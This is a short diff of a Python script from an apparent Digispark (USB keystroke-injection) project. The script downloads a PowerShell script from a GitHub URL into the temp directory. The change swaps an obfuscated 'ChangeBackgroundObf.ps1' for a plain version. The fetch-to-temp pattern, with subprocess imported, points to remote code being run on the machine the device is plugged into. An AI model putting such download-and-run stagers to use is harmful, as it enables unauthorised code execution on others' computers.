@@ -4,7 +4,7 @@ import subprocess
 import urllib.request
 
 # Step 1: Download PS1 to temp
-ps1_url = "https://raw.githubusercontent.com/huh445/Digispark-Scripts/main/ChangeBackgroundObf.ps1"  # 👈 Replace with actual URL
+ps1_url = "https://raw.githubusercontent.com/huh445/Digispark-Scripts/main/ChangeBackground.ps1"  # 👈 Replace with actual URL
 temp_dir = tempfile.gettempdir()
 ps1_path = os.path.join(temp_dir, "bgchange.ps1")
 
